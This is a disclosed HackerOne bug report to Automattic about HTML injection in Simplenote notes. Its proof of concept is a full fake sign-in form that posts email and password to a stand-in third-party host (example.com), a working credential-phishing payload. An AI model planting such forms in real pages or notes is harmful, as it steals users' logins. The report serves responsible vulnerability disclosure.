# Improper markup sanitization.

## Report Details
- **Report ID**: 289823
- **URL**: https://hackerone.com/reports/289823
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-11-13T12:01:59.713Z
- **Disclosed**: 2017-12-01T13:34:32.547Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
# Summary

One can inject HTML into a note and create a login form that sends the user's details to a third-party server. This was a fun issue to play around with. I will let the PoC do most of the talking for a change.

# PoC

Paste the following HTML into a Simplenote. I am using the Simplenote app v.1.0.8 on Ubuntu 17.10.

```html
Sign in to Simplenote

<h1 class="signin">Please sign in</h1>
</br>
<form name="login" id="login" action="http://example.com/login.php">
    <fieldset class="classic-fieldset" style="border:none;">
        <div class="input-fields">
            <p>
                <label for="email">Email</label>
                <input name="email" id="email" placeholder="Email" required="" type="email" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;">
            </p>
            <div id="warn"></div>
            <p>
                <label for="password">Password</label>
                <input name="password" id="password" placeholder="Password" required="" type="password">
            </p>
        </div>
        <br>
        <p>
            <input class="submit button" value="Sign In" type="submit">
        </p>
        <p>
            <input name="remember" value="1" id="check" checked="checked" type="checkbox">
            <label for="remember" class="option">Remember Me</label>
        </p>
        <p class="forgot"><a href="#">Forgot your password?</a></p>
    </fieldset>
</form>
```

I have published the note so that you can verify the issue: https://app.simplenote.com/p/th9BPG. The design could do with a little bit of work in order to make it more convincing, but I am sure you get the gist of the issue.

{F239084}


## Attachments
- simplenote_form.png
